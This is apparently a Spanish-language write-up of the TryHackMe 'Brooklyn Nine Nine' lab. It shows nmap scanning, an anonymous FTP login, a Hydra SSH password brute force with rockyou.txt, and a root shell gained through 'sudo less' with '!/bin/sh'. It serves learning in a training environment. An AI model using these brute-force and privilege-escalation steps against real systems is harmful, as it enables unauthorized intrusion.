@@ -1,0 +1,231 @@
+I"�9<p>La máquina Brookling99 es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos tanto la flag del usuario como la de root.</p>
+
+<h1 id="enumeración"><a href="#header-1"></a>Enumeración</h1>
+
+<p>La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.</p>
+
+<p>Usaremos nmap para analizar los puertos abiertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nv">$IP</span><span class="nt">-VICTIMA</span> <span class="nt">-oG</span> allPorts
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Escaneo todos los puertos abiertos: -p- –open</p>
+  </li>
+  <li>
+    <p>Mediante –min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.</p>
+  </li>
+  <li>
+    <p>Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.</p>
+  </li>
+  <li>
+    <p>Para que el escaneo no aplique resolución DNS usamos -n</p>
+  </li>
+  <li>
+    <p>En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-10-14 06:22 EDT
+Initiating Connect Scan at 06:22
+Scanning 10.10.209.206 <span class="o">[</span>65535 ports]
+Discovered open port 22/tcp on 10.10.209.206
+Discovered open port 21/tcp on 10.10.209.206
+Discovered open port 80/tcp on 10.10.209.206
+Stats: 0:00:14 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Connect Scan
+Connect Scan Timing: About 76.50% <span class="k">done</span><span class="p">;</span> ETC: 06:23 <span class="o">(</span>0:00:05 remaining<span class="o">)</span>
+Completed Connect Scan at 06:23, 19.84s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.209.206
+Host is up, received user-set <span class="o">(</span>0.058s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-10-14 06:22:57 EDT <span class="k">for </span>19s
+Not shown: 40658 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>, 24874 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>19.89 seconds
+</code></pre></div></div>
+
+<p>Nos reporta una serie de puertos abiertos. Debido a que el puerto 80 está abierto, introducimos la $IP-VICTIMA en un buscador y nos reporta una imagen con el título de la máquina junto a un pequeño texo. El texto no nos da información por lo que checkeamos la consola para tratar de conseguir algo más.</p>
+
+<p>Conseguimos obtener un comentario en la consola que dice:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Have you ever heard of steganography?
+</code></pre></div></div>
+<p>Lo tendremos en cuenta. A parte del puerto 80, están abiertos el 21 y 22. En el puerto 21 está corriedno un servicio ftp por lo que vamos a realizar un escaneo con nmap para obtener más información de estos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80 10.10.209.206 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-10-14 06:27 EDT
+Nmap scan report <span class="k">for </span>10.10.209.206
+Host is up <span class="o">(</span>0.049s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.79.39
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.23 seconds
+[1]    4872 segmentation fault  nmap -sCV -p21,22,80 10.10.209.206 -oN targeted
+</span></code></pre></div></div>
+
+<p>Parece ser que nos podemos logear con el usuario Anonyous y sin contraseña. Además existe un archivo .txt</p>
+
+<p>Nos conectamos entonces con ese usuario y sin contraseña:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp 10.10.209.206
+Connected to 10.10.209.206.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.209.206:jorge<span class="o">)</span>: anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; 
+</code></pre></div></div>
+
+<p>Listamos el contendio y nos aparece el archivo .txt</p>
+
+<p>Usando el comando get nos la podemos pasar a nuestro equipo. La abrimos y vemos su contenido:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">ls
+</span>229 Entering Extended Passive Mode <span class="o">(||</span>|30950|<span class="o">)</span>
+150 Here comes the directory listing.
+<span class="nt">-rw-r--r--</span>    1 0        0             119 May 17  2020 note_to_jake.txt
+226 Directory send OK.
+ftp&gt; get note_to_jake.txt
+<span class="nb">local</span>: note_to_jake.txt remote: note_to_jake.txt
+229 Entering Extended Passive Mode <span class="o">(||</span>|13605|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>note_to_jake.txt <span class="o">(</span>119 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">********************************************************</span>|   119       34.03 KiB/s    00:00 ETA
+226 Transfer complete.
+119 bytes received <span class="k">in </span>00:00 <span class="o">(</span>2.18 KiB/s<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Lo abrimos en nuestro equipo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>note_to_jake.txt
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: note_to_jake.txt
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ From Amy,
+   2   │ 
+   3   │ Jake please change your password. It is too weak and holt will be mad <span class="k">if </span>someone hack into 
+       │ the nine nine
+   4   │ 
+   5   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div>
+
+<p>Nos dan la información que el usuario Jake tiene una contraseña débil, por lo que mediante hydra intentamos conseguirla:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ hydra <span class="nt">-l</span> jake <span class="nt">-P</span> /home/jorge/Descargas/rockyou.txt 10.10.209.206 <span class="nt">-t</span> 4 ssh
+Hydra v9.3 <span class="o">(</span>c<span class="o">)</span> 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>
+
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2022-10-14 06:53:57
+<span class="o">[</span>DATA] max 4 tasks per 1 server, overall 4 tasks, 14344401 login tries <span class="o">(</span>l:1/p:14344401<span class="o">)</span>, ~3586101 tries per task
+<span class="o">[</span>DATA] attacking ssh://10.10.209.206:22/
+<span class="o">[</span>STATUS] 44.00 tries/min, 44 tries <span class="k">in </span>00:01h, 14344357 to <span class="k">do in </span>5433:29h, 4 active
+<span class="o">[</span>22][ssh] host: 10.10.209.206   login: jake   password: ?????????
+</code></pre></div></div>
+
+<h1 id="acceso-al-sistema"><a href="$header-1"></a>Acceso al sistema</h1>
+
+<p>La conseguimos e intentamos conectarnos mediante SSH con el usuario y la contraseña:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh jake@10.10.209.206
+The authenticity of host <span class="s1">'10.10.209.206 (10.10.209.206)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:4: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.209.206<span class="s1">' (ED25519) to the list of known hosts.
+jake@10.10.209.206'</span>s password: 
+Last login: Tue May 26 08:56:58 2020
+jake@brookly_nine_nine:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>Estamos dentro! Investigamos un poco por los usuarios y conseguimos la flag del usuario:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jake@brookly_nine_nine:~<span class="nv">$ </span><span class="nb">cd</span> /home
+jake@brookly_nine_nine:/home<span class="nv">$ </span><span class="nb">cd </span>holt/
+jake@brookly_nine_nine:/home/holt<span class="nv">$ </span><span class="nb">ls
+</span>nano.save  user.txt
+jake@brookly_nine_nine:/home/holt<span class="nv">$ </span><span class="nb">cat </span>user.txt
+???????????????????????????????
+jake@brookly_nine_nine:/home/holt<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>En este punto podemos usar sudo -l para ver los permisos que tenemos a la hora de ejecutar comandos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jake@brookly_nine_nine:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>jake on brookly_nine_nine:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User jake may run the following commands on brookly_nine_nine:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/less
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios"><a href="$header-1"></a>Escalada de privilegios</h1>
+
+<p>Podemos usar el comando less como root: Nos dirigimos a <a href="gtfobins.github.io">GTFOBins</a> y buscamos el binario less y lo que podemos hacer siendo sudo.</p>
+
+<p>Nos reporta esta información:</p>
+
+<blockquote>
+  <p>sudo less /etc/profile
+!/bin/sh</p>
+</blockquote>
+
+<p>Ejecutamos entonces el comando (sudo less /etc/profile) e introducimos !/bin/sh</p>
+
+<p>Hemos conseguido el acceso total al sistema y si hacemos whoami nos reporta que somos root, parece ser que no nos ha hecho falta usar esteganografía.</p>
+
+<p>Investigamos por el directorio de root y conseguimos la flag del mismo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># whoami</span>
+root
+<span class="c"># ls</span>
+<span class="c"># cd /root</span>
+<span class="c"># ls</span>
+root.txt
+<span class="c"># cat root.txt</span>
+<span class="nt">--</span> Creator : Fsociety2006 <span class="nt">--</span>
+Congratulations <span class="k">in </span>rooting Brooklyn Nine Nine
+Here is the flag: ??????????????????????????????
+
+Enjoy!!
+</code></pre></div></div>
+<p>Conseguimos la flag de root!</p>
+
+<p>Muchas gracias por leer este writeup, espero que te haya gustado!</p>
+:ET
